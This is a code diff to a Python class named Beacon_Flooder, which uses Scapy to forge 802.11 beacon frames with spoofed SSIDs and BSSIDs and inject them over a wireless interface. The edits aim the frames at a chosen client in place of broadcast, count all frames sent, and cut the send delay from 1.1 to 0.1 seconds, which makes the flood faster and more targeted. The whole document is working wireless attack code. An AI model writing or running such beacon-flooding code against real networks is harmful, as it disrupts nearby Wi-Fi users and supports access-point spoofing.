@@ -1300,7 +1300,7 @@ class Beacon_Flooder():
                 bssid = Beacon_Flooder.get_bssid(type=bssid_type)
 
                 # CRAFT FRAME
-                dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=bssid, addr3=bssid)
+                dot11 = Dot11(type=0, subtype=8, addr1=client, addr2=bssid, addr3=bssid)
                 beacon = Dot11Beacon(cap='ESS', beacon_interval=100)
                 essid = Dot11Elt(ID='SSID', info=ssid.encode(), len=len(ssid))
                 dsset = Dot11Elt(ID='DSset', info=b'\x06')
@@ -1328,7 +1328,7 @@ class Beacon_Flooder():
    
 
     @classmethod
-    def frame_injector(cls, frames, verbose=True, count=1):
+    def frame_injector(cls, frames, count=1):
         """This method will inject the frames into the network"""
 
 
@@ -1362,16 +1362,14 @@ class Beacon_Flooder():
 
                 try:
 
-                    frames = Beacon_Flooder.get_frames(ssid_type=1, bssid_type=1, amount=15)
-
                     
                     # INJECT PACKETS INTO 
-                    sendp(frames, verbose=verbose, iface=cls.iface)
+                    sendp(frames, verbose=0, iface=cls.iface)
 
 
 
                     # NOTICE
-                    sent += count
+                    sent += count * len(frames)
 
                    
                     # COLORS
@@ -1387,7 +1385,7 @@ class Beacon_Flooder():
 
 
                     # DELAY
-                    time.sleep(1.1)
+                    time.sleep(0.1)
                     
 
 
@@ -1397,7 +1395,7 @@ class Beacon_Flooder():
                     console.print(f"ATTEMPTING TO ESCAPE THE MATRIX", style="bold red")
 
                     try:
-                        time.sleep(3)
+                        time.sleep(0.5)
 
                         break
                     
